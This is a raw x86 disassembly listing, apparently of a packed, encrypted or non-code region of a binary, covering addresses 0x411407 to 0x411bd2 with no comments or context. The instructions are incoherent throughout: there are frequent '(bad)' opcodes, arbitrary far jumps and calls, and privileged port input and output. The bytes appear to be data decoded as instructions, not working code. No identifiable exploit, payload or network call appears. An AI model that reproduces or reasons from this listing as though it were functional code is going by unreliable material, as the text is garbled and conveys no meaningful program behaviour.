  411407:	and    al,0x3a
  411409:	ins    BYTE PTR es:[edi],dx
  41140a:	add    eax,0x4f2bfe57
  41140f:	fs stc 
  411411:	push   0xffffffe4
  411413:	mov    edi,0x19ffd04f
  411418:	or     DWORD PTR [edi-0x50],eax
  41141b:	or     DWORD PTR ds:0xba6027cd,ebx
  411421:	dec    esp
  411422:	mov    ds:0x9f5b24a5,al
  411427:	pop    esi
  411428:	dec    eax
  411429:	in     eax,0x58
  41142b:	lahf   
  41142c:	aam    0xdf
  41142e:	shl    BYTE PTR [edx],1
  411430:	popf   
  411431:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411432:	fld    QWORD PTR [edi+0x250b4a69]
  411438:	add    al,0x8b
  41143a:	sbb    al,0xa4
  41143c:	jne    0x4113e8
  41143e:	push   0x58
  411440:	sub    eax,0x251b1c43
  411445:	out    0x40,al
  411447:	ss pop ecx
  411449:	sbb    ecx,edx
  41144b:	xor    bx,WORD PTR [ecx+0x3b]
  41144f:	add    edi,ebp
  411451:	in     eax,dx
  411452:	js     0x411487
  411454:	jmp    0xd635:0x3a0bc2c0
  41145b:	pop    ebx
  41145c:	add    al,0x3c
  41145e:	push   esp
  41145f:	out    dx,eax
  411460:	lahf   
  411461:	dec    ebp
  411462:	and    esi,eax
  411464:	dec    edx
  411465:	scas   al,BYTE PTR es:[edi]
  411466:	mov    ecx,0xb73c7878
  41146b:	outs   dx,BYTE PTR cs:[esi]
  41146d:	lods   eax,DWORD PTR ds:[esi]
  41146e:	push   esi
  41146f:	sahf   
  411470:	jp     0x411492
  411472:	idiv   esi
  411474:	cmc    
  411475:	test   bl,0x74
  411478:	cmp    ah,ah
  41147a:	rcr    BYTE PTR [ebx],0x27
  41147d:	and    bh,bl
  41147f:	jmp    0xa1e02fb3
  411484:	mov    dl,al
  411486:	in     al,0xa4
  411488:	xor    eax,0x3cb37def
  41148d:	fild   DWORD PTR [eax+0x498d3ca5]
  411493:	push   esi
  411494:	call   0x50bd7322
  411499:	xchg   ecx,eax
  41149a:	sbb    dh,BYTE PTR [ecx]
  41149c:	push   ss
  41149d:	cmp    DWORD PTR [edi+0x1d],ecx
  4114a0:	into   
  4114a1:	cs int3 
  4114a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114a4:	push   0x8affcef9
  4114a9:	cmp    eax,0x20261403
  4114ae:	adc    ah,BYTE PTR [eax+0x60]
  4114b1:	push   esp
  4114b2:	inc    ebx
  4114b3:	sar    DWORD PTR [ecx+0x5862c9b6],1
  4114b9:	sub    al,0xc7
  4114bb:	and    ch,ah
  4114bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114be:	dec    ebp
  4114bf:	mov    edi,0x759b7cda
  4114c4:	mov    ecx,0xddb963f8
  4114c9:	push   ss
  4114ca:	mov    ch,0xfb
  4114cc:	mov    BYTE PTR [ebp-0x2d],bl
  4114cf:	cdq    
  4114d0:	mov    ch,BYTE PTR [edx+ecx*2]
  4114d3:	and    al,0xee
  4114d5:	enter  0x92a2,0x86
  4114d9:	mul    BYTE PTR [esp+ebp*4+0x39]
  4114dd:	dec    esi
  4114de:	or     eax,DWORD PTR [eax]
  4114e0:	nop
  4114e1:	out    dx,al
  4114e2:	dec    edx
  4114e3:	cmp    eax,0x2de173ae
  4114e8:	hlt    
  4114e9:	cld    
  4114ea:	loope  0x411524
  4114ec:	mov    dl,0x63
  4114ee:	xchg   BYTE PTR [ebx+0x322a11dc],al
  4114f4:	sti    
  4114f5:	ds mov esp,0x554783de
  4114fb:	cmp    DWORD PTR [edx+0x1d],ebp
  4114fe:	ret    0x2216
  411501:	ins    DWORD PTR es:[edi],dx
  411502:	push   edi
  411503:	sbb    eax,0xa89da1ee
  411508:	jmp    0x4114d2
  41150a:	mov    es,WORD PTR [esi-0x41fdc57f]
  411510:	dec    esi
  411511:	sar    BYTE PTR [esi-0x4b6a8626],cl
  411517:	call   0xcc04:0x52421fa4
  41151e:	add    al,0xdc
  411520:	xchg   edi,eax
  411521:	mov    esi,0x97a7eaa4
  411526:	dec    edi
  411527:	int3   
  411528:	mov    bh,0x8f
  41152a:	stc    
  41152b:	or     eax,0xfcbe45ae
  411530:	xchg   DWORD PTR [esi-0x4],edx
  411533:	enter  0xb15f,0x2f
  411537:	fst    QWORD PTR [ebx+ebp*8+0x4c]
  41153b:	and    ebx,DWORD PTR [ecx-0x2d46dff0]
  411541:	clc    
  411542:	xor    ebx,DWORD PTR [eax+0x3a295962]
  411548:	cwde   
  411549:	les    ecx,FWORD PTR [eax-0x8]
  41154c:	xchg   ebp,eax
  41154d:	xor    DWORD PTR [ebx-0x27881b03],esp
  411553:	lods   eax,DWORD PTR ds:[esi]
  411554:	jle    0x4115d2
  411556:	jmp    0x267f:0xaaa822f3
  41155d:	mov    eax,0x2ef21b25
  411562:	sbb    al,BYTE PTR [edx+0x6209d516]
  411568:	das    
  411569:	ja     0x4114f3
  41156b:	mov    ebx,0xcd649dd4
  411570:	push   es
  411571:	dec    BYTE PTR [esi-0x16]
  411574:	mov    DWORD PTR ds:0x5b8f8525,eax
  41157a:	je     0x41157c
  41157c:	inc    edx
  41157d:	ror    BYTE PTR [ecx+0x6dae1a18],1
  411583:	out    0x85,al
  411585:	pop    esi
  411586:	dec    esi
  411587:	inc    ebx
  411588:	cmp    eax,0x75889c36
  41158d:	pop    eax
  41158e:	add    edi,edx
  411590:	test   BYTE PTR [esi],dh
  411592:	mov    DWORD PTR [ecx-0x5d],esi
  411595:	sub    DWORD PTR [ecx],ecx
  411597:	mov    cl,BYTE PTR [ebx-0x128dd0ed]
  41159d:	(bad)  
  41159e:	stos   DWORD PTR es:[edi],eax
  41159f:	call   0x13f0:0x31d2aa3a
  4115a6:	lods   eax,DWORD PTR ds:[esi]
  4115a7:	or     al,0x9c
  4115a9:	fstp   DWORD PTR [ecx+ecx*8+0x4ae99988]
  4115b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4115b1:	aas    
  4115b2:	add    eax,0x8e00e915
  4115b7:	fidivr DWORD PTR [edx+ebx*1-0x64]
  4115bb:	push   0x74
  4115bd:	mov    ds:0x73ea48ef,eax
  4115c2:	ins    BYTE PTR es:[edi],dx
  4115c3:	ins    DWORD PTR es:[edi],dx
  4115c4:	and    eax,0xc188e145
  4115c9:	(bad)  
  4115cb:	scas   al,BYTE PTR es:[edi]
  4115cc:	jl     0x4115a8
  4115ce:	sti    
  4115cf:	or     BYTE PTR [ebx+0x2c],cl
  4115d2:	jne    0x411616
  4115d4:	les    eax,FWORD PTR [edx+0x30]
  4115d7:	ins    BYTE PTR es:[edi],dx
  4115d8:	jmp    0x6fb3:0x5efa68e2
  4115df:	sar    DWORD PTR [esi-0x7071af02],0x4b
  4115e6:	inc    esp
  4115e7:	pop    ss
  4115e8:	xor    eax,0xb4ccfd8f
  4115ed:	sti    
  4115ee:	mov    cl,0xcd
  4115f0:	or     dh,BYTE PTR [ecx+0x7e2570b0]
  4115f6:	loopne 0x4115b0
  4115f8:	es in  al,dx
  4115fa:	(bad)  
  4115fb:	mov    esp,0x1b5c7e78
  411600:	in     eax,dx
  411601:	xlat   BYTE PTR ds:[ebx]
  411602:	pop    edx
  411603:	xchg   edi,eax
  411604:	mov    ds:0xe32f7666,al
  411609:	mov    ch,0x81
  41160b:	stos   BYTE PTR es:[edi],al
  41160c:	aad    0x38
  41160e:	pop    ss
  41160f:	or     eax,0xe5da3273
  411614:	jp     0x411679
  411616:	dec    esp
  411617:	xchg   DWORD PTR [edx-0x4b95f06f],edx
  41161d:	cli    
  41161e:	mov    eax,0xe738d508
  411623:	ja     0x411670
  411625:	inc    esp
  411626:	bound  eax,QWORD PTR [edx-0x10]
  411629:	bound  edx,QWORD PTR [esi]
  41162b:	je     0x4115c5
  41162d:	(bad)  
  41162e:	mul    DWORD PTR [esi]
  411630:	pop    eax
  411631:	sbb    DWORD PTR [edi+0x2c],ebp
  411634:	push   es
  411635:	(bad)  
  411636:	and    ah,BYTE PTR [edx+0x680956c1]
  41163c:	adc    edi,eax
  41163e:	lahf   
  41163f:	popa   
  411640:	aam    0x1f
  411642:	(bad)  
  411643:	scas   eax,DWORD PTR es:[edi]
  411644:	adc    al,BYTE PTR [ebx]
  411646:	lahf   
  411647:	arpl   WORD PTR [edi+0x61],bx
  41164a:	push   es
  41164b:	mov    bl,0xaa
  41164d:	inc    esi
  41164e:	or     edx,edx
  411650:	jmp    0xc494:0x5b33c71c
  411657:	jle    0x411697
  411659:	xchg   ecx,eax
  41165a:	lods   al,BYTE PTR ds:[esi]
  41165b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41165c:	pop    ebp
  41165d:	cdq    
  41165e:	stc    
  41165f:	ins    BYTE PTR es:[edi],dx
  411660:	lock repnz mov fs,WORD PTR [esi+0x22]
  411665:	sub    al,0xc8
  411667:	int3   
  411668:	jl     0x41166d
  41166a:	mov    esp,DWORD PTR [ebp+0x49]
  41166d:	inc    edi
  41166e:	push   cs
  41166f:	xor    DWORD PTR [eax-0x20],edi
  411672:	and    eax,0x66b61ec9
  411677:	ret    0xd438
  41167a:	arpl   WORD PTR [edi-0x16b1701b],cx
  411680:	jne    0x41165a
  411682:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411683:	mov    eax,ds:0xa3a20ae1
  411688:	test   al,0x19
  41168a:	call   0x4996:0xd9dcbb93
  411691:	mov    edi,0x85a4b45b
  411696:	mov    edi,DWORD PTR [ecx]
  411698:	push   esi
  411699:	stc    
  41169a:	adc    ebx,DWORD PTR [ebx-0x12]
  41169d:	adc    esi,DWORD PTR [esi-0x63fea1b5]
  4116a3:	cmp    al,0xf4
  4116a5:	jle    0x4116e5
  4116a7:	call   0xd7a:0x3b4411fd
  4116ae:	dec    edi
  4116af:	mov    esp,0xcbaf11df
  4116b4:	call   0x3f69a93c
  4116b9:	sub    al,0xbd
  4116bb:	addr16 iret 
  4116bd:	and    edx,ebp
  4116bf:	lds    eax,FWORD PTR [ebx]
  4116c1:	push   0x67b69621
  4116c6:	xor    al,BYTE PTR [esi]
  4116c8:	sub    bh,dh
  4116ca:	mov    WORD PTR [eax+0x2836b67c],gs
  4116d0:	xor    eax,0x6f678e0d
  4116d5:	dec    esi
  4116d6:	or     eax,0x7438383c
  4116db:	jo     0x411724
  4116dd:	les    esp,FWORD PTR ds:[ebx-0x22]
  4116e1:	sbb    BYTE PTR [edi-0x41b3a41e],bh
  4116e7:	(bad)  
  4116e8:	push   eax
  4116e9:	dec    eax
  4116ea:	inc    ebx
  4116eb:	jns    0x4116d0
  4116ed:	int    0x0
  4116ef:	jnp    0x4116e2
  4116f1:	mov    eax,ds:0x841810be
  4116f6:	out    0x8c,al
  4116f8:	gs dec eax
  4116fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116fb:	mov    edi,0x952e11cf
  411700:	mov    ebp,0xc7f16374
  411705:	repz xor al,0xd7
  411708:	sub    al,0xd3
  41170a:	addr16 push ss
  41170c:	push   ebx
  41170d:	outs   dx,BYTE PTR ds:[esi]
  41170e:	bound  edi,QWORD PTR [ecx+0x5b]
  411711:	lds    ebp,FWORD PTR [edi+0x2f99f9d8]
  411717:	or     eax,0x6d8ab21a
  41171c:	and    DWORD PTR [edi-0x53],ebx
  41171f:	clc    
  411720:	mov    ch,0x2
  411722:	mov    esi,ebp
  411724:	sub    DWORD PTR [esi-0x38],0xcab1f082
  41172b:	mov    eax,ds:0x75d378ab
  411730:	imul   eax,DWORD PTR [eax+0x5064d22],0x45
  411737:	push   esi
  411738:	and    al,bh
  41173a:	jmp    0xf04de412
  41173f:	int3   
  411740:	mov    al,0xc5
  411742:	adc    al,0xbc
  411744:	sbb    bl,BYTE PTR [edi+0x1c]
  411747:	int3   
  411748:	retf   0x541
  41174b:	fisubr DWORD PTR [ecx-0x60]
  41174e:	js     0x411739
  411750:	test   BYTE PTR [ebx],0x3c
  411753:	mov    dl,ch
  411755:	inc    esi
  411756:	test   al,0x77
  411758:	dec    ebp
  411759:	add    BYTE PTR [ecx],dh
  41175b:	cmp    ebx,edi
  41175d:	lods   al,BYTE PTR ds:[esi]
  41175e:	push   0xffffffd6
  411760:	jne    0x411762
  411762:	inc    esp
  411763:	lods   al,BYTE PTR ds:[esi]
  411764:	add    eax,0x2129fcb9
  411769:	or     esp,DWORD PTR [ebx-0x44a5ae64]
  41176f:	adc    ebp,edx
  411771:	or     ecx,DWORD PTR [edx]
  411773:	jno    0x41175b
  411775:	pushf  
  411776:	pop    esi
  411777:	and    DWORD PTR [edx-0x71],esi
  41177a:	pop    ecx
  41177b:	ds jnp 0x1a760b5d
  411782:	mov    bl,0x86
  411784:	cmp    dh,BYTE PTR [esi-0x50bfb7c5]
  41178a:	jle    0x4117a3
  41178c:	outs   dx,BYTE PTR ds:[esi]
  41178d:	jo     0x4117ed
  41178f:	adc    DWORD PTR [edi+esi*1-0x4a],ebx
  411793:	addr16 sahf 
  411795:	(bad)  
  411796:	xchg   ecx,eax
  411797:	(bad)  
  411798:	out    dx,al
  411799:	xchg   esp,eax
  41179a:	sub    eax,ebp
  41179c:	loope  0x4117c2
  41179e:	imul   edi,DWORD PTR [ecx+0x68c67309],0x52
  4117a5:	jb     0x4117d9
  4117a7:	loope  0x411750
  4117a9:	or     ebx,DWORD PTR [eax-0x6e]
  4117ac:	sub    eax,ebx
  4117ae:	icebp  
  4117af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117b0:	mov    ds,esp
  4117b2:	inc    eax
  4117b3:	aaa    
  4117b4:	xor    DWORD PTR [ebx],edi
  4117b6:	xchg   ah,ch
  4117b8:	bound  ebx,QWORD PTR [ebp+0x19700c9a]
  4117be:	dec    esp
  4117bf:	sub    al,0xfe
  4117c1:	stc    
  4117c2:	aam    0x62
  4117c4:	push   edi
  4117c5:	and    dl,al
  4117c7:	xchg   edx,eax
  4117c8:	dec    ebp
  4117c9:	(bad)  
  4117ca:	mov    bl,0x4d
  4117cc:	clc    
  4117cd:	dec    ebp
  4117ce:	dec    esp
  4117cf:	imul   esp,edi,0xe5cc58a6
  4117d5:	xor    DWORD PTR [ebp+0x6c],ebp
  4117d8:	mov    edi,0x5c95092d
  4117dd:	and    esp,DWORD PTR [edx]
  4117df:	popf   
  4117e0:	scas   eax,DWORD PTR es:[edi]
  4117e1:	cmp    DWORD PTR [esi],ebx
  4117e3:	retf   
  4117e4:	in     al,0x16
  4117e6:	xchg   ecx,eax
  4117e7:	cdq    
  4117e8:	jae    0x4117d0
  4117ea:	xchg   ebx,eax
  4117eb:	cmp    esp,DWORD PTR [edi]
  4117ed:	jns    0x411787
  4117ef:	int3   
  4117f0:	mov    ah,0x6c
  4117f2:	mov    ah,0xf4
  4117f4:	mov    dh,0xa3
  4117f6:	jae    0x4117b7
  4117f8:	sub    esi,DWORD PTR [esi+0x2ffbaec9]
  4117fe:	push   ebp
  4117ff:	mov    ds:0x11827685,al
  411804:	add    BYTE PTR [edi],0x8d
  411807:	loop   0x41180c
  411809:	mov    ch,BYTE PTR [ebp-0x35]
  41180c:	cmp    eax,0xfaa40d44
  411811:	ror    ecx,0x29
  411814:	dec    ecx
  411815:	cld    
  411816:	loop   0x4117fe
  411818:	pop    edx
  411819:	inc    ebx
  41181a:	jnp    0x41181f
  41181c:	les    eax,FWORD PTR [edi]
  41181e:	sbb    eax,0x36b8ef2f
  411823:	pop    ss
  411824:	sub    ah,al
  411826:	and    eax,0x7a865fa0
  41182b:	lea    ebp,[esi]
  41182d:	je     0x41182f
  41182f:	sub    ah,BYTE PTR [esi]
  411831:	jbe    0x4117be
  411833:	outs   dx,DWORD PTR ds:[esi]
  411834:	aad    0xb1
  411836:	jmp    0x7edc:0x1966ab0
  41183d:	fwait
  41183e:	mov    eax,0x6cfb6387
  411843:	pop    ebx
  411844:	(bad)  
  411845:	shr    DWORD PTR [ebx+0x48],1
  411848:	test   eax,0x63309584
  41184d:	sub    edi,DWORD PTR [edx-0x47]
  411850:	sahf   
  411851:	and    eax,0x498e34b3
  411856:	pop    es
  411857:	js     0x411850
  411859:	call   0xae799c24
  41185e:	push   esi
  41185f:	outs   dx,BYTE PTR ds:[esi]
  411860:	or     DWORD PTR [ebx+0x919d99b],edx
  411866:	int3   
  411867:	call   0xa991:0xe9a06f6e
  41186e:	repnz (bad) 
  411870:	dec    DWORD PTR [edx-0x17b046ae]
  411876:	ins    BYTE PTR es:[edi],dx
  411877:	push   esp
  411878:	jle    0x4118c5
  41187a:	retf   0xa570
  41187d:	mov    WORD PTR [ebx-0x2c9f8d06],?
  411883:	loopne 0x41185a
  411885:	in     al,dx
  411886:	sbb    al,BYTE PTR [edx+0x183c5fde]
  41188c:	fdivr  st(5),st
  41188e:	sub    BYTE PTR [eax+0x41],dl
  411891:	mov    DWORD PTR [ebx-0x70],ebp
  411894:	call   0xdb370eff
  411899:	pop    eax
  41189a:	jnp    0x411915
  41189c:	jge    0x4118e4
  41189e:	push   esi
  41189f:	add    DWORD PTR [esi-0x32c32f65],ecx
  4118a5:	sub    bh,BYTE PTR [edi-0x19d8123d]
  4118ab:	mov    bl,0xfb
  4118ad:	jp     0x41186d
  4118af:	push   edx
  4118b0:	cmp    al,0xc1
  4118b2:	adc    DWORD PTR [esi+edi*4-0x6ad69f20],ecx
  4118b9:	mov    dh,0x71
  4118bb:	test   BYTE PTR [ebx-0x77],bh
  4118be:	inc    ebx
  4118bf:	sar    dh,0xdd
  4118c2:	pop    eax
  4118c3:	pop    edx
  4118c4:	sbb    edx,DWORD PTR [eax+0x52]
  4118c7:	in     eax,dx
  4118c8:	push   ss
  4118c9:	mov    eax,ds:0x31fc6d94
  4118ce:	or     edx,esi
  4118d0:	mov    ebx,0xaf8aedb4
  4118d5:	dec    edi
  4118d6:	xchg   edi,eax
  4118d7:	test   DWORD PTR [eax+0x73656fc4],edx
  4118dd:	jp     0x41192c
  4118df:	ins    DWORD PTR es:[edi],dx
  4118e0:	mov    ah,0x61
  4118e2:	test   eax,0xe1329dbe
  4118e7:	cs aas 
  4118e9:	les    edx,FWORD PTR [ebx+0x6ec0ef2f]
  4118ef:	idiv   DWORD PTR [esi-0x7e817ce8]
  4118f5:	mov    al,ds:0x24d7b154
  4118fa:	push   ecx
  4118fb:	jp     0x4118ad
  4118fd:	scas   eax,DWORD PTR es:[edi]
  4118fe:	shl    cl,1
  411900:	inc    edx
  411901:	mov    dl,0xc2
  411903:	pop    esi
  411904:	cld    
  411905:	dec    ebp
  411906:	add    ecx,edx
  411908:	sbb    al,0xc6
  41190a:	aad    0x1b
  41190c:	clc    
  41190d:	aam    0x39
  41190f:	lahf   
  411910:	inc    ecx
  411911:	sub    esi,0x5c
  411914:	sahf   
  411915:	inc    eax
  411916:	inc    ebp
  411917:	sub    BYTE PTR [edi-0x1e],dl
  41191a:	cmp    BYTE PTR [esi],bh
  41191c:	xlat   BYTE PTR ds:[ebx]
  41191d:	pushf  
  41191e:	mov    ch,0x21
  411920:	test   BYTE PTR ds:0x4a9a7302,al
  411926:	jl     0x411907
  411928:	cmp    al,0x26
  41192a:	jl     0x411979
  41192c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41192d:	push   eax
  41192e:	ins    BYTE PTR es:[edi],dx
  41192f:	sti    
  411930:	mov    ds:0xb254177,al
  411935:	idiv   DWORD PTR [edx-0x25]
  411938:	xchg   ebx,eax
  411939:	push   eax
  41193a:	into   
  41193b:	pop    ds
  41193c:	fwait
  41193d:	adc    BYTE PTR [ebp+0x7edba1f4],cl
  411943:	xor    edi,DWORD PTR [ebp+0x7a]
  411946:	add    al,0x93
  411948:	out    0x38,al
  41194a:	enter  0x4624,0x6b
  41194e:	in     eax,0x5f
  411950:	mov    ds:0xee10e5e3,al
  411955:	push   0x957c6bc0
  41195a:	mov    bh,0xd2
  41195c:	cli    
  41195d:	outs   dx,DWORD PTR ds:[esi]
  41195e:	test   eax,0x5c173bb
  411963:	stos   DWORD PTR es:[edi],eax
  411964:	jmp    0x411995
  411966:	xchg   BYTE PTR [edx-0x755cd7c4],dl
  41196c:	sub    al,0x7f
  41196e:	sbb    bh,BYTE PTR [eax-0x744596fd]
  411974:	xor    ah,BYTE PTR [ebx+0x3345693e]
  41197a:	jge    0x411955
  41197c:	ins    DWORD PTR es:[edi],dx
  41197d:	mov    ds:0x474c8926,al
  411982:	cmp    BYTE PTR [eax+ebx*1+0x6f],0xac
  411987:	pop    edi
  411988:	add    DWORD PTR [edi-0x51486df2],ebx
  41198e:	xchg   esp,eax
  41198f:	cmc    
  411990:	test   DWORD PTR [ecx-0x5d],ebp
  411993:	mov    al,ds:0xe1f7d160
  411998:	fisttp DWORD PTR [ebx+ebx*2+0x34]
  41199c:	ins    BYTE PTR es:[edi],dx
  41199d:	int3   
  41199e:	repz out 0x0,eax
  4119a1:	sahf   
  4119a2:	in     eax,0xb2
  4119a4:	popa   
  4119a5:	jns    0x411991
  4119a7:	push   ecx
  4119a8:	cmp    DWORD PTR ss:[edi],esp
  4119ab:	sti    
  4119ac:	scas   al,BYTE PTR es:[edi]
  4119ad:	inc    esi
  4119ae:	push   esp
  4119af:	iret   
  4119b0:	xchg   ebx,eax
  4119b1:	dec    edi
  4119b2:	pop    ebx
  4119b3:	retf   
  4119b4:	pop    ebx
  4119b5:	std    
  4119b6:	cli    
  4119b7:	test   DWORD PTR [esp+0x25],0xd2bc246d
  4119bf:	fadd   DWORD PTR [edi]
  4119c1:	t1mskc ecx,ecx
  4119c6:	es popf 
  4119c8:	jb     0x4119dc
  4119ca:	test   DWORD PTR [ecx],0x2a40e233
  4119d0:	mov    edi,DWORD PTR [ebp-0x44]
  4119d3:	lahf   
  4119d4:	push   ebx
  4119d5:	cli    
  4119d6:	mov    ebp,0x2e8ad62f
  4119db:	push   es
  4119dc:	pop    esp
  4119dd:	sbb    eax,0xff8b5870
  4119e2:	in     al,0xc1
  4119e4:	push   esi
  4119e5:	lea    ebx,[edi-0x61]
  4119e8:	scas   eax,DWORD PTR es:[edi]
  4119e9:	test   DWORD PTR [ecx],edi
  4119eb:	adc    dh,bl
  4119ed:	or     ebx,DWORD PTR [edx+0xf332f09]
  4119f3:	ss hlt 
  4119f5:	shl    DWORD PTR [ebx-0x21af54fd],cl
  4119fb:	add    al,0xbd
  4119fd:	fcomp  QWORD PTR [ecx-0x6f0f82aa]
  411a03:	sti    
  411a04:	mov    bh,0x7c
  411a06:	out    dx,eax
  411a07:	lds    edx,FWORD PTR [ecx+0x23df517f]
  411a0d:	push   0xdc8df508
  411a12:	fdivr  QWORD PTR [eax+0x1c93f958]
  411a18:	loopne 0x411a4a
  411a1a:	pushf  
  411a1b:	mov    dl,0x2d
  411a1d:	jecxz  0x4119c0
  411a1f:	cld    
  411a20:	pop    ss
  411a21:	jno    0x4119ef
  411a23:	add    al,BYTE PTR [eax]
  411a25:	jl     0x4119ea
  411a27:	mov    cl,0xe9
  411a29:	adc    DWORD PTR [ecx],esi
  411a2b:	lahf   
  411a2c:	push   0x8456301a
  411a31:	out    dx,al
  411a32:	into   
  411a33:	push   edi
  411a34:	sub    al,0x47
  411a36:	xor    BYTE PTR [esi-0x26],dh
  411a39:	add    bl,BYTE PTR ds:0x55ee84de
  411a3f:	jne    0x4119cf
  411a41:	adc    DWORD PTR [edi-0x36611888],0xbde7551e
  411a4b:	and    DWORD PTR [ebx-0x67171338],esp
  411a51:	pop    ds
  411a52:	out    0x3b,eax
  411a54:	loope  0x411a70
  411a56:	push   esi
  411a57:	sub    DWORD PTR [edx+0x72],ebx
  411a5a:	stos   BYTE PTR es:[edi],al
  411a5b:	push   ax
  411a5d:	jg     0x411a7d
  411a5f:	adc    al,0x4b
  411a62:	pushf  
  411a63:	inc    ebp
  411a64:	(bad)  
  411a65:	call   esp
  411a67:	lds    eax,FWORD PTR [eax+0xb]
  411a6a:	out    0xf1,eax
  411a6c:	leave  
  411a6d:	add    ebx,eax
  411a6f:	retf   
  411a70:	inc    ecx
  411a71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a72:	adc    esp,DWORD PTR ds:0x51590b60
  411a78:	inc    esi
  411a79:	mov    ds:0xf0b670e1,eax
  411a7e:	xchg   DWORD PTR [ebx],esi
  411a80:	je     0x411a04
  411a82:	mov    BYTE PTR [ebx+esi*2-0x15],ch
  411a86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a87:	fwait
  411a88:	add    al,0x7b
  411a8a:	(bad)  
  411a8b:	stc    
  411a8c:	xchg   ecx,eax
  411a8d:	cmp    eax,0x67683bc2
  411a92:	jno    0x411a44
  411a94:	imul   ecx,eax,0xfffffffe
  411a97:	mov    dl,0x5
  411a99:	mov    edx,0x4f31fc65
  411a9e:	hlt    
  411a9f:	shl    BYTE PTR [esi],0xa3
  411aa2:	pushf  
  411aa3:	push   es
  411aa4:	mov    bh,BYTE PTR [ebx+ebp*2]
  411aa7:	loop   0x411a73
  411aa9:	lock xchg esp,eax
  411aab:	mov    ebx,0x219e9382
  411ab0:	ins    DWORD PTR es:[edi],dx
  411ab1:	cmp    al,0x99
  411ab3:	pop    edx
  411ab4:	pop    ecx
  411ab5:	fdivr  st,st(4)
  411ab7:	leave  
  411ab8:	push   ds
  411ab9:	dec    ecx
  411aba:	js     0x411b2a
  411abc:	xchg   ebx,eax
  411abd:	in     al,0x74
  411abf:	cmp    eax,0x3680bd45
  411ac4:	mov    ecx,0xab327353
  411ac9:	mov    eax,ds:0x208b1e35
  411ace:	ror    BYTE PTR [edx],cl
  411ad0:	cmp    DWORD PTR [ecx+0x53a511d6],esi
  411ad6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ad7:	push   ss
  411ad8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ad9:	loope  0x411aac
  411adb:	retf   
  411adc:	retf   
  411add:	cmp    DWORD PTR [ebx+eax*4-0x5a7908c1],ebp
  411ae4:	fdivr  st,st(1)
  411ae6:	rcr    DWORD PTR [ecx],1
  411ae8:	jp     0x411b42
  411aea:	inc    ecx
  411aeb:	pop    ebx
  411aec:	sbb    eax,DWORD PTR [ecx+0x182df5e3]
  411af2:	xchg   BYTE PTR [bx+0x7d93],ah
  411af7:	mov    WORD PTR [edx+0x77],gs
  411afa:	add    eax,DWORD PTR [esi+0x9]
  411afd:	mov    ah,0xc1
  411aff:	add    DWORD PTR [edx+edi*8],edx
  411b02:	imul   esi,ebx,0xffffffff
  411b05:	xchg   edx,eax
  411b06:	pop    ebp
  411b07:	mov    esi,0x65c1f2b9
  411b0c:	(bad)  
  411b0d:	lea    ebx,[esi]
  411b0f:	neg    DWORD PTR [eax-0x70890ef2]
  411b15:	xchg   BYTE PTR [ebx],al
  411b17:	sub    eax,0x9e7f8470
  411b1c:	dec    edi
  411b1d:	jo     0x411ae5
  411b1f:	shl    BYTE PTR [eax],0x8e
  411b22:	cmp    al,0xae
  411b24:	sbb    al,0x85
  411b26:	add    bl,bl
  411b28:	push   eax
  411b29:	adc    eax,0xeab87ae8
  411b2e:	mov    bh,BYTE PTR [esi]
  411b30:	fistp  DWORD PTR [ebx-0x2e]
  411b33:	push   esp
  411b34:	(bad)  
  411b35:	pop    ss
  411b36:	mov    ebx,0x36d575
  411b3b:	xchg   ebp,eax
  411b3c:	jb     0x411b11
  411b3e:	das    
  411b3f:	ret    0x925a
  411b42:	mov    esi,0xb53a9018
  411b47:	lahf   
  411b48:	cmp    BYTE PTR [ecx],cl
  411b4a:	push   ds
  411b4b:	aas    
  411b4c:	jmp    0x411bc9
  411b4e:	inc    edx
  411b4f:	sub    dl,al
  411b51:	lods   eax,DWORD PTR ds:[esi]
  411b52:	inc    esi
  411b53:	stc    
  411b54:	data16 in al,dx
  411b56:	mov    al,ds:0xdc063e8e
  411b5b:	jmp    0x411b4c
  411b5d:	sbb    ebp,esp
  411b5f:	sub    ch,al
  411b61:	in     eax,0xc0
  411b63:	xchg   edi,eax
  411b64:	xchg   ebp,eax
  411b65:	sub    DWORD PTR [ebp+ecx*8+0x7b],esp
  411b69:	scas   al,BYTE PTR es:[edi]
  411b6a:	lock inc edi
  411b6c:	retf   0xec20
  411b6f:	cld    
  411b70:	cmp    BYTE PTR [ebx+0x636e70b5],dh
  411b76:	daa    
  411b77:	shl    DWORD PTR [esi],1
  411b79:	daa    
  411b7a:	cs test edx,ebx
  411b7d:	fisttp WORD PTR [edi-0x23707401]
  411b83:	inc    ecx
  411b84:	and    ch,ch
  411b86:	fwait
  411b87:	add    DWORD PTR ds:0x4c98ed17,ebx
  411b8d:	jnp    0x411bde
  411b8f:	fild   DWORD PTR [eax+esi*4+0x36]
  411b93:	call   0x26b78cd
  411b98:	dec    esp
  411b99:	pop    edi
  411b9a:	cwde   
  411b9b:	das    
  411b9c:	mov    edx,0x27ba8a25
  411ba1:	int3   
  411ba2:	inc    ecx
  411ba3:	jbe    0x411bcc
  411ba5:	pop    es
  411ba6:	cmp    eax,0x4d74dd84
  411bab:	hlt    
  411bac:	ret    
  411bad:	enter  0xff2d,0x9e
  411bb1:	mov    bl,0xe1
  411bb3:	dec    ebx
  411bb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bb5:	inc    ebx
  411bb6:	pop    edx
  411bb7:	pop    ebp
  411bb8:	bound  edx,QWORD PTR [edx+0x33]
  411bbb:	and    DWORD PTR [eax],0xffffff97
  411bbe:	stos   BYTE PTR es:[edi],al
  411bbf:	sub    eax,0xbde02ca0
  411bc4:	push   ss
  411bc5:	pop    eax
  411bc6:	add    eax,0x49bad3a2
  411bcb:	(bad)  
  411bcc:	fidivr DWORD PTR ds:0xf57d5677
  411bd2:	mov    ds:0xa9add0ae,al
